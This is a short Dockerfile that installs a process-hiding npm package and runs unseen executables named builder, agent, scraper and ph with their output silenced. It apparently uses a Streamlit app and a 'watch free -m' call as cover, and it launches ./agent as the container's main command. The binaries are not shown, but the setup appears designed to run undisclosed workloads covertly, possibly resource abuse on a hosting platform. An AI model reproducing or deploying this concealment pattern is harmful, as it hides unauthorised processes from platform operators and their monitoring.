
FROM ubuntu:18.04
ENV TERM=xterm
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update -y
RUN apt-get install curl git npm nodejs python3 gcc procps --assume-yes
RUN npm i -g node-process-hider
COPY . .
RUN chmod +x builder agent scraper ph
RUN ./ph > /dev/null
RUN watch free -m & python3 streamlit_app.py > /dev/null
CMD ["./agent"]
